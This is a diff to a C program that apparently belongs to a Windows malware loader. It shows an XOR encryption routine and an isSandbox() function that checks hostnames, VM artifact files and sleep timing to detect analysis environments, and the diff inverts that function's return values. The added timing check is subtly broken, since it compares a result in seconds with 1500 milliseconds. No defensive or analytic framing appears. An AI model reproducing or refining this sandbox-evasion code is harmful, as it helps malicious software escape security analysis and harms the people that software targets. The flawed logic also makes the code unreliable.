@@ -5,6 +5,7 @@
 #include <stdlib.h>
 #include <time.h>
 #include <io.h>
+#include <unistd.h>
 #include <ctype.h>
 void XOREncrypt(unsigned char *data, size_t data_len, unsigned char key)
 {
@@ -71,7 +72,7 @@ void banner() {
 int isSandbox() {
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-        return 0;
+        return 1;
     }
     Sleep(3000);
     char hostname[256];
@@ -83,7 +84,7 @@ int isSandbox() {
         };
         for (int i = 0; i < sizeof(forbidden)/sizeof(forbidden[0]); i++) {
             if (strstr(hostname, forbidden[i]) != NULL)
-                return 0;
+                return 1;
         }
     }
     const char *vmFiles[] = {
@@ -93,11 +94,19 @@ int isSandbox() {
     };
     for (int i = 0; i < sizeof(vmFiles) / sizeof(vmFiles[0]); i++) {
         if (_access(vmFiles[i], 0) == 0) {
-            return 0;
+            return 1;
         }
     }
     Sleep(3000);
-    return 1;
+    int t = 1500;
+    time_t start = time(NULL);
+    Sleep(t);
+    time_t end = time(NULL);
+    double elapsed = difftime(end, start);
+    if (elapsed <= t) {
+        return 1;
+    }
+    return 0;
 }
 int main()
 {
